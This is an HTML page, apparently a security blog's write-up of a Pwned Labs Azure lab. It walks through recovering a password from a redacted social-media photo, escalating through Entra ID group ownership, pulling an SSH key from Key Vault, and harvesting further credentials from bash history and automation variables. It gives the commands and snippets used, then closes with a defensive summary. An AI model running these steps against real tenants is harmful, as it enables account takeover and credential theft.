@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Unmask Privileged Access In Azure | SecFortress</title>
+<meta name="keywords" content="Azure, Red Teaming, Entra-ID, Powershell, ROADrecon">
+<meta name="description" content="After leveraging a password found in an image and gaining access to Azure as Matteus Lundgren, we escalated privileges by adding ourselves to the DEVICE-ADMINS group, granting us access to critical resources, including an SSH key for the VM AUTOMAT01.">
+<meta name="author" content="SecFortress">
+<link rel="canonical" href="http://localhost:1313/hacking/unmask_privileged_access_in_azure/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/unmask_privileged_access_in_azure/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/hacking/unmask_privileged_access_in_azure/">
+  <meta property="og:site_name" content="SecFortress">
+  <meta property="og:title" content="Unmask Privileged Access In Azure">
+  <meta property="og:description" content="After leveraging a password found in an image and gaining access to Azure as Matteus Lundgren, we escalated privileges by adding ourselves to the DEVICE-ADMINS group, granting us access to critical resources, including an SSH key for the VM AUTOMAT01.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hacking">
+    <meta property="article:published_time" content="2024-10-16T11:54:55+01:00">
+    <meta property="article:modified_time" content="2024-10-16T11:54:55+01:00">
+    <meta property="article:tag" content="Azure">
+    <meta property="article:tag" content="Red Teaming">
+    <meta property="article:tag" content="Entra-ID">
+    <meta property="article:tag" content="Powershell">
+    <meta property="article:tag" content="ROADrecon">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Unmask Privileged Access In Azure">
+<meta name="twitter:description" content="After leveraging a password found in an image and gaining access to Azure as Matteus Lundgren, we escalated privileges by adding ourselves to the DEVICE-ADMINS group, granting us access to critical resources, including an SSH key for the VM AUTOMAT01.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Unmask Privileged Access In Azure",
+      "item": "http://localhost:1313/hacking/unmask_privileged_access_in_azure/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Unmask Privileged Access In Azure",
+  "name": "Unmask Privileged Access In Azure",
+  "description": "After leveraging a password found in an image and gaining access to Azure as Matteus Lundgren, we escalated privileges by adding ourselves to the DEVICE-ADMINS group, granting us access to critical resources, including an SSH key for the VM AUTOMAT01.",
+  "keywords": [
+    "Azure", "Red Teaming", "Entra-ID", "Powershell", "ROADrecon"
+  ],
+  "articleBody": "Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nOverview As part of our pre-engagement reconnaissance several Mega Big Tech employee profiles on LinkedIn were reviewed. One of their new employees, Matteus Lundgren posted recently about his new role and office space. This caught the eye as there appeared to be a Post-It note on the wall that had later been obfuscated. You are tasked with gaining initial access and demonstrating impact by increasing privileges.\nInitial Access and Privilege Escalation from Social Media Reconnaissance First of all we start by downloading the image this user posted on their social media from here The image says “#newoffice Rate.....” with a redacted text using a Markup’s pencil, which poses significant risk as shown in this forum However it is possible to use GIMP, An image manipulation program to retrieve the obscured text. Under the Colors drop down menu select Brightness-Contract.. and edit. We got the text SUMMERDAZE1! or maybe we can call it a password.\nThe next thing we need is this user actual username, We know they go by the name “Matteus Lundgren” but how is it saved on the domain ?.\nFor active directory On-Prem, I have found this tool to be useful as it creates a possible username from a given username and company name.\nHowever it is possible to guess this one as Mega Big Tech uses the below format :\n@megabigtech.com `first.last@megabigtech.com With this format we can go ahead and try to login with a PS Session\naz login Which worked as shown in the below screenshot We can also confirm that we have successfully login with the below command PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az account show { \"environmentName\": \"AzureCloud\", \"homeTenantId\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx\", \"id\": \"ceff06cb-e29d-4486-a3ae-eaaec5689f94\", \"isDefault\": true, \"managedByTenants\": [], \"name\": \"Microsoft Azure Sponsorship\", \"state\": \"Enabled\", \"tenantDefaultDomain\": \"megabigtech.com\", \"tenantDisplayName\": \"Default Directory\", \"tenantId\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx\", \"user\": { \"name\": \"matteus@megabigtech.com\", \"type\": \"user\" } } To understand the standpoint we are in, we can go ahead and list all resources that our current user has access to. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az resource list [ { \"changedTime\": \"2023-11-30T17:17:51.364990+00:00\", \"createdTime\": \"2023-11-30T17:07:03.686020+00:00\", \"extendedLocation\": null, \"id\": \"/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01\", \"identity\": null, \"kind\": null, \"location\": \"eastus\", \"managedBy\": null, \"name\": \"AUTOMAT01\", \"plan\": null, \"properties\": null, \"provisioningState\": \"Succeeded\", \"resourceGroup\": \"mbt-rg-5\", \"sku\": null, \"tags\": null, \"type\": \"Microsoft.Compute/virtualMachines\", \"zones\": [ \"1\" ] } ] As show above we have access to a virtual machine named AUTOMAT01 in the mbt-rg-5 resource group.\nWe can therefore take a step further to retrieve general information about this virtual machine PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az vm show --resource-group mbt-rg-5 --name AUTOMAT01 { \"additionalCapabilities\": { \"hibernationEnabled\": false, \"ultraSsdEnabled\": null }, \"applicationProfile\": null, \"availabilitySet\": null, \"billingProfile\": null, \"capacityReservation\": null, \"diagnosticsProfile\": null, \"evictionPolicy\": null, \"extendedLocation\": null, \"extensionsTimeBudget\": null, \"hardwareProfile\": { \"vmSize\": \"Standard_B1ms\", \"vmSizeProperties\": null }, \"host\": null, \"hostGroup\": null, \"id\": \"/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01\", \"identity\": null, \"instanceView\": null, \"licenseType\": null, \"location\": \"eastus\", \"name\": \"AUTOMAT01\", \"networkProfile\": { \"networkApiVersion\": null, \"networkInterfaceConfigurations\": null, \"networkInterfaces\": [ { \"deleteOption\": \"Detach\", \"id\": \"/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1\", \"primary\": null, \"resourceGroup\": \"mbt-rg-5\" } ] }, \"osProfile\": { \"adminPassword\": null, \"adminUsername\": \"automation\", \"allowExtensionOperations\": true, \"computerName\": \"AUTOMAT01\", \"customData\": null, \"linuxConfiguration\": { \"disablePasswordAuthentication\": true, \"enableVmAgentPlatformUpdates\": false, \"patchSettings\": { \"assessmentMode\": \"ImageDefault\", \"automaticByPlatformSettings\": null, \"patchMode\": \"ImageDefault\" }, \"provisionVmAgent\": true, \"ssh\": { \"publicKeys\": [ { \"keyData\": \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6mR2ZA1xLw4xONa+hQYoVGcmKMZtVU+WVQjREfDgHsDZSIjDrvXAPOQe9falxs3Wj14EjOzPyCtnq3teFrqUaUjiFohaZTdU5mKikVFhLyG8hHvTp1QEI9bBYOVSi2n3pUUKq16VgZwpPIWJscdRJcFiN03mhC1clZwu4T/p7lFFNlGW33SxNN7vaXA05lX2laF3UGTBjU5fzRJ4zzC1Nn5OEUwIyRKsGE6uy/rZxhr5qrjGpthL27KpssXKcg9tJgTBsMTwQWsBSLCjUjrJv1VCQKkGlY5UXRck24TdVSSYt7j/m6G702huC1DrDEtbjXSGWZ17MT1RRIqChsdUY2l3+g8TSPaHyrxkC4y6q8scUWVgrIcvUHqtAJhYmEyeRVtiJcKSerqKdwsyNuIUbflkc/l99n0Dr1cyj/LDRdxVzjSjWxKMRxPgWrZ/kQ9mC5PicXuLXlQTceiIlExT59UTaYFpHmpmnarE3yzCRdqHyMfdu3tmsTEp39vt+7i0= generated-by-azure\", \"path\": \"/home/automation/.ssh/authorized_keys\" } ] } }, \"requireGuestProvisionSignal\": true, \"secrets\": [], \"windowsConfiguration\": null }, \"plan\": null, \"platformFaultDomain\": null, \"priority\": null, \"provisioningState\": \"Succeeded\", \"proximityPlacementGroup\": null, \"resourceGroup\": \"mbt-rg-5\", \"resources\": null, \"scheduledEventsProfile\": null, \"securityProfile\": null, \"storageProfile\": { \"dataDisks\": [], \"diskControllerType\": \"SCSI\", \"imageReference\": { \"communityGalleryImageId\": null, \"exactVersion\": \"20.04.202310250\", \"id\": null, \"offer\": \"0001-com-ubuntu-server-focal\", \"publisher\": \"canonical\", \"sharedGalleryImageId\": null, \"sku\": \"20_04-lts-gen2\", \"version\": \"latest\" }, \"osDisk\": { \"caching\": \"ReadWrite\", \"createOption\": \"FromImage\", \"deleteOption\": \"Delete\", \"diffDiskSettings\": null, \"diskSizeGb\": 30, \"encryptionSettings\": null, \"image\": null, \"managedDisk\": { \"diskEncryptionSet\": null, \"id\": \"/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/disks/AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494\", \"resourceGroup\": \"mbt-rg-5\", \"securityProfile\": null, \"storageAccountType\": \"Standard_LRS\" }, \"name\": \"AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494\", \"osType\": \"Linux\", \"vhd\": null, \"writeAcceleratorEnabled\": null } }, \"tags\": null, \"timeCreated\": \"2023-11-30T17:07:03.721328+00:00\", \"type\": \"Microsoft.Compute/virtualMachines\", \"userData\": null, \"virtualMachineScaleSet\": null, \"vmId\": \"fc3e4e78-01a7-4cf2-a79c-1b897b6c951e\", \"zones\": [ \"1\" ] } Here’s a breakdown of the vital information from the output of your above command:\nVM Name: AUTOMAT01\nResource Group: mbt-rg-5\nLocation: eastus\nVM Size: Standard_B1ms (Basic tier, 1 vCPU, 2 GiB RAM)\nOS Disk Size: 30 GB (Managed disk with Standard_LRS storage)\nOS Type: Linux (Ubuntu 20.04 LTS)\nAdmin Username: automation\nSSH Public Key: An SSH public key has been deployed for the user automation, located at /home/automation/.ssh/authorized_keys.\nVM State: Provisioning state is Succeeded (VM creation was successful).\nDisk Encryption: No disk encryption settings enabled.\nZone: The VM is located in availability zone 1.\nNetwork:\nThe VM is associated with a network interface /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1. According to the lab, since we have a public key for SSH, it is worth noting down an IP address for this Virtual Machine, However we have the following error\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az vm show -d -g mbt-rg-5 -n AUTOMAT01 --query publicIps -o tsv (AuthorizationFailed) The client 'matteus@megabigtech.com' with object id '0dd32296-20f5-447c-b879-c57922db1ff0' does not have authorization to perform action 'Microsoft.Network/networkInterfaces/read' over scope '/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1' or the scope is invalid. If access was recently granted, please refresh your credentials. Code: AuthorizationFailed Message: The client 'matteus@megabigtech.com' with object id '0dd32296-20f5-447c-b879-c57922db1ff0' does not have authorization to perform action 'Microsoft.Network/networkInterfaces/read' over scope '/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1' or the scope is invalid. If access was recently granted, please refresh your credentials. ROADrecon For Structured Enumeration To better get familiar with this environment we can use the ROADrecon tool from the (Rogue Office 365 and Azure (active) Directory tools) framework to interact better with Entra-ID\n❯ pip install roadrecon Then authenticate to the utility to acquire tokens for our owned user.\n❯ roadrecon auth -u matteus@megabigtech.com -p SUMMERDAZE1! Tokens were written to .roadtools_auth Then execute the below command to collect all Azure information that the user has permission to see.\n❯ roadrecon gather Starting data gathering phase 1 of 2 (collecting objects) Starting data gathering phase 2 of 2 (collecting properties and relationships) ROADrecon gather executed in 107.38 seconds and issued 1843 HTTP requests. Finally start the ROADrecon GUI web server with so we can visually examine the Azure environment.\n❯ roadrecon gui * Serving Flask app 'roadtools.roadrecon.server' * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://127.0.0.1:5000 Press CTRL+C to quit If Bloodhoundis available we can also transfer the collected data to the corresponding Neo4j instance.\n❯ roadrecon plugin bloodhound --neodatabase localhost -du neo4j -dp neo4j1 Connecting to neo4j Running queries Done! Navigating to the Users tab and searching for our present user Matt..., We can view the overview of this user. As shown below we have the ObjectID and Role Memeberships they have been assigned to.\nChecking the Owned objects tab we see that our current user is the owner of the DEVICE-ADMINS group! This group allows desktop support to access resources and could help us in our goal to move laterally and vertically within the environment.\nClicking the Raw tab we see the ObjectID of the group is shown as aff1bca2-0c41-44e9-8e2c-8d6ca50fec45 .\nReturn to the Owned objects tab and click on this group, we can see the group overview below.\nCurrently there are no members, but we can add ourselves to this group using the PowerShell Az module, since we are the owner.\nConnect-AzAccount Add-AzADGroupMember -TargetGroupObjectId aff1bca2-0c41-44e9-8e2c-8d6ca50fec45 -MemberObjectId 0dd32296-20f5-447c-b879-c57922db1ff0 After running this command we will need to refresh our session in order for any permissions associated with this group to take effect.\nDisconnect-AzAccount az logout Connect-AzAccount az login Then running the below command we can check out the updated Azure role assignments.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzRoleAssignment The most important output as shown in the above screenshots are the :\nScope : This shows which resources the user has permissions over. DisplayName : shows the user or group assigned the role. (Remember we already belong to the DEVICE-ADMINS so we have permissions this group has too) RoleDefinitionName : shows the specific role (and associated permissions) assigned. So in summary the ;\nMatteus Lundgren has been assigned the Reader role, limited to the virtual machine AUTOMAT01 within the mbt-rg-5 resource group, allowing him read-only access to that VM.\nFor the DEVICE-ADMINS Group:\nThey have access to resources in mbt-rg-5, including: Key Vault (Devices-new): The group can manage sensitive data like passwords or encryption keys stored in this Key Vault. Network Interface and Public IP for AUTOMAT01: The group can view network-related details for this VM. This setup controls what resources each entity can interact with in a specific resource group.\nInitial Access to the AUTOMAT01 VM We can go ahead and enumerate the Key Vault! and as shown below a secret resource named AUTOMAT01 is discovered which is stored in ASCII format.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az keyvault secret list --vault-name Devices-new [ { \"attributes\": { \"created\": \"2023-12-01T22:26:11+00:00\", \"enabled\": true, \"expires\": null, \"notBefore\": null, \"recoverableDays\": 90, \"recoveryLevel\": \"Recoverable+Purgeable\", \"updated\": \"2023-12-01T22:26:11+00:00\" }, \"contentType\": null, \"id\": \"https://devices-new.vault.azure.net/secrets/AUTOMAT01\", \"managed\": null, \"name\": \"AUTOMAT01\", \"tags\": { \"file-encoding\": \"ascii\" } } ] We can then use the az keyvault secret show command to read the secret in this resource and as shown below we have an SSH key.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az keyvault secret show --vault-name Devices-new --name AUTOMAT01 { \"attributes\": { \"created\": \"2023-12-01T22:26:11+00:00\", \"enabled\": true, \"expires\": null, \"notBefore\": null, \"recoverableDays\": 90, \"recoveryLevel\": \"Recoverable+Purgeable\", \"updated\": \"2023-12-01T22:26:11+00:00\" }, \"contentType\": null, \"id\": \"https://devices-new.vault.azure.net/secrets/AUTOMAT01/80776fe595c64551a061e38de06eedab\", \"kid\": null, \"managed\": null, \"name\": \"AUTOMAT01\", \"tags\": { \"file-encoding\": \"ascii\" }, \"value\": \"-----BEGIN RSA PRIVATE KEY-----\\nMIIG4gIBAAKCAYEAupkdmQNcS8OMTjWvoUGKFRnJijGbVVPllUI0RHw4B7A2UiIw\\n671wDzkHvX2pcbN1o9eBIzsz8grZ6t7Xha6lGlI4haIWmU3VOZiopFRYS8hvIR70\\n6dUBCPWwWDlUotp96VFCqtelYGcKTyFibHHUSXBYjdN5oQtXJWcLuE/6e5RRTZRl\\nt90sTTe72lwNOZV9pWhd1BkwY1OX80SeM8wtTZ+ThFMCMkSrBhOrsv62cYa+aq4x--SNIP--\\n-----END RSA PRIVATE KEY-----\\n\" } It is also possible to download this SSH secret key on our machine without removing the \\n terminator.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az keyvault secret download --vault-name Devices-new --name AUTOMAT01 --file AUTOMAT01.pem Since we have permission over the virtual machine AUTOMAT01 in the resource group mbt-rg-5, as shown when enumerating the role assignments in the below screenshot previously, we can go ahead and get the IP address of this VM.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az vm show -d -g mbt-rg-5 -n AUTOMAT01 --query publicIps -o tsv 13.68.147.240 Then we can grant rw permissions to the SSH private key and connect via SSH. If you are wondering how we got the username then refer to the top of this write-up during the enumeration of the VM phase\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e chmod 600 ./AUTOMAT01.pem PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e ssh -i AUTOMAT01.pem automation@13.68.147.240 The authenticity of host '13.68.147.240 (13.68.147.240)' can't be established. ED25519 key fingerprint is SHA256:6GhdVGDYwkrfNkqprJC3ybwWOrbNuHwE7OxvJVvpWFo. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '13.68.147.240' (ED25519) to the list of known hosts. Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1052-azure x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Oct 16 09:09:14 UTC 2024 System load: 0.0 Processes: 103 Usage of /: 12.1% of 28.89GB Users logged in: 0 Memory usage: 18% IPv4 address for eth0: 10.1.0.4 Swap usage: 0% --SNIP-- automation@AUTOMAT01:~$ whoami automation automation@AUTOMAT01:~$ hostnamectl Static hostname: AUTOMAT01 Icon name: computer-vm Chassis: vm Machine ID: 5ce911bbc50f4dc7876fbed23e106dd8 Boot ID: 4ed5ef75483e407999f463f8d4a7f9eb Virtualization: microsoft Operating System: Ubuntu 20.04.6 LTS Kernel: Linux 5.15.0-1052-azure Architecture: x86-64s Post Exploitation It is worth doing some laying off the land enumeration, finding sensitive files/ hardcoded credentials; And as shown below we have another user credential in the .bash_history file of the user automation home directory.\naz login -u \"serene@megabigtech.com\" -p \"xxxxxxxxxxx\" Accessing Automation Account and Exporting Runbook in Azure We can therefore go ahead back to our powershell session and connect to the new Azure account we just got!\nDisconnect-AzAccount az logout Connect-AzAccount az login Then Access to an Automation Account named automation-dev and a Runbook named Schedule-VMStartStop was enumerated using Get-AzResource. or the az resource list command as used previously.\nAzure Automation Accounts enable task automation using PowerShell or Python scripts for managing enterprise resources and workloads, streamlining deployment, operations, and decommissioning processes.\nRunbooks are scripts within Automation Accounts that automate tasks, ensuring consistent management of resources at scale and minimizing manual intervention.\nWe can use the Get-AzAutomationAccount cmdlet to retrieve key details about the Automation Account, confirming whether public access is enabled or not.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzAutomationAccount -ResourceGroupName \"mbt-rg-5\" -Name \"automation-dev\" SubscriptionId : ceff06cb-e29d-4486-a3ae-eaaec5689f94 ResourceGroupName : mbt-rg-5 AutomationAccountName : automation-dev Location : eastus State : Ok Plan : Basic CreationTime : 12/1/2023 2:21:55PM +01:00 LastModifiedTime : 12/1/2023 2:21:55PM +01:00 LastModifiedBy : Tags : {} Identity : Encryption : Microsoft.Azure.Management.Automation.Models.EncryptionProperties PublicNetworkAccess : True Since we have PublicNetworkAccess set to True we can export the Runbook with Export-AzAutomationRunbook.\nExport-AzAutomationRunbook -ResourceGroupName \"mbt-rg-5\" -AutomationAccountName \"automation-dev\" -Name Schedule-VMStartStop -Output . As shown below this file doesn’t contain any hardcoded credentials or sensitive information that would be useful from an attacker scenario.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e file Schedule-VMStartStop.ps1 Schedule-VMStartStop.ps1: ASCII text, with CRLF line terminators PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e cat Schedule-VMStartStop.ps1 param ( [Parameter(Mandatory=$true)] [string] $Action # Should be either 'Start' or 'Stop' ) # Authenticate with Azure $Conn = Get-AutomationConnection -Name AzureRunAsConnection Connect-AzAccount -ServicePrincipal -TenantId $Conn.TenantId -ApplicationId $Conn.ApplicationId -CertificateThumbprint $Conn.CertificateThumbprint # Fetch VMs based on tags $VMsToProcess = Get-AzVM | Where-Object { ($_.Tags[\"AutoStart\"] -eq \"True\" -and $Action -eq \"Start\") -or ($_.Tags[\"AutoStop\"] -eq \"True\" -and $Action -eq \"Stop\") } foreach ($VM in $VMsToProcess) { if ($Action -eq \"Start\") { # Start the VM Start-AzVM -Name $VM.Name -ResourceGroupName $VM.ResourceGroupName -ErrorAction Continue } elseif ($Action -eq \"Stop\") { # Stop the VM Stop-AzVM -Name $VM.Name -ResourceGroupName $VM.ResourceGroupName -Force -ErrorAction Continue } else { Write-Output \"Invalid Action Specified\" } } Write-Output \"Processed all VMs for action: $Action\" Credential Security in Automation Accounts It’s also important to check for credentials configured in the automation account because automation tasks often require authentication to interact with various resources. While the actual password is not directly accessible, the credentials are still available for use within Runbooks to perform tasks that require authentication, such as managing resources or executing scripts. This ensures that the automation can securely access necessary resources without manual intervention.\nGet-AzAutomationCredential -ResourceGroupName \"mbt-rg-5\" -AutomationAccountName \"automation-dev\" | Format-Table Name, CreationTime, Description We can check if we have write access to the automation-dev automation account using the Get-AzRoleAssignment command.\nAs shown above we only have the Reader role meaning we can’t edit the Runbook, if we could, we would append the following PowerShell to the script and see the credentials in the job output.\n$cred = Get-AutomationPSCredential -Name automate-default $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password If you are still interested in knowing how to edit the Runbook regardless of the missing permissions then refer to my alternate blog, Link Here.\nIdentifying Unencrypted Variables Azure Automation supports variable assets, which are globally accessible variables for Runbooks. Sensitive variables like keys and passwords should be encrypted for security. However, in this instance, it appears that a sensitive variable was stored unencrypted, posing a security risk. This oversight could potentially grant unauthorized access to critical information, highlighting the importance of proper security practices in automation accounts.\nGet-AzAutomationVariable -ResourceGroupName \"mbt-rg-5\" -AutomationAccountName \"automation-dev\" | fl Name, Value, Description As shown above we have the flag value and a Global administrator credential, haha ᯓ★.\nSummary X Defense Employees often unintentionally expose sensitive information on social media, which red teams can exploit for phishing and password creation. In one case, an employee believed they had redacted sensitive data using iOS Markup, but it was recoverable due to transparency issues. Additionally, we exploited an exposed password in the .bash_history file, highlighting the risks of passing passwords via command lines, which can be logged in history files and Windows event logs, however to authenticate without a browser, we used az login --use-device-code to force device code authentication for more security. Finally, we obtained global admin credentials due to insecure secret storage, emphasizing the importance of saving sensitive data as encrypted variables, which are not encrypted by default.\nResources Lab Link : https://pwnedlabs.io/labs/unmask-privileged-access-in-azure https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0 https://medium.com/@mgbecken/roadtools-1e9dabc2c8e9 https://learn.microsoft.com/en-us/azure/automation/automation-security-overview ",
+  "wordCount" : "2600",
+  "inLanguage": "en",
+  "datePublished": "2024-10-16T11:54:55+01:00",
+  "dateModified": "2024-10-16T11:54:55+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "SecFortress"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/unmask_privileged_access_in_azure/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SecFortress",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
+                <img src="http://localhost:1313/images/avatar.jpeg" alt="" aria-label="logo"
+                    height="25">SecFortress</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="🥷 Hacking">
+                    <span>🥷 Hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sec-fortress.github.io/" title="✍️ Notes">
+                    <span>✍️ Notes</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami" title="🇳🇬 Whoami">
+                    <span>🇳🇬 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Unmask Privileged Access In Azure
+    </h1>
+    <div class="post-description">
+      After leveraging a password found in an image and gaining access to Azure as Matteus Lundgren, we escalated privileges by adding ourselves to the DEVICE-ADMINS group, granting us access to critical resources, including an SSH key for the VM AUTOMAT01.
+    </div>
+    <div class="post-meta"><span title='2024-10-16 11:54:55 +0100 WAT'>October 16, 2024</span>&nbsp;·&nbsp;<span>13 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>Overview</strong></a></li>
+    <li><a href="#initial-access-and-privilege-escalation-from-social-media-reconnaissance"><strong>Initial Access and Privilege Escalation from Social Media Reconnaissance</strong></a></li>
+    <li><a href="#roadrecon-for-structured-enumeration"><strong>ROADrecon For Structured Enumeration</strong></a></li>
+    <li><a href="#initial-access-to-the-automat01-vm"><strong>Initial Access to the AUTOMAT01 VM</strong></a></li>
+    <li><a href="#post-exploitation"><strong>Post Exploitation</strong></a></li>
+    <li><a href="#accessing-automation-account-and-exporting-runbook-in-azure"><strong>Accessing Automation Account and Exporting Runbook in Azure</strong></a></li>
+    <li><a href="#credential-security-in-automation-accounts"><strong>Credential Security in Automation Accounts</strong></a></li>
+    <li><a href="#identifying-unencrypted-variables"><strong>Identifying Unencrypted Variables</strong></a></li>
+    <li><a href="#summary-x-defense"><strong>Summary X Defense</strong></a></li>
+    <li><a href="#resources"><strong>Resources</strong></a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.</strong></p>
+<h2 id="overview"><strong>Overview</strong><a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>As part of our pre-engagement reconnaissance several Mega Big Tech employee profiles on LinkedIn were reviewed. One of their new employees, Matteus Lundgren posted recently about his new role and office space. This caught the eye as there appeared to be a Post-It note on the wall that had later been obfuscated. You are tasked with gaining initial access and demonstrating impact by increasing privileges.</p>
+<p><img loading="lazy" src="https://i.pinimg.com/originals/02/62/fd/0262fdab2584fec5301fea9314c66618.gif"></p>
+<h2 id="initial-access-and-privilege-escalation-from-social-media-reconnaissance"><strong>Initial Access and Privilege Escalation from Social Media Reconnaissance</strong><a hidden class="anchor" aria-hidden="true" href="#initial-access-and-privilege-escalation-from-social-media-reconnaissance">#</a></h2>
+<ul>
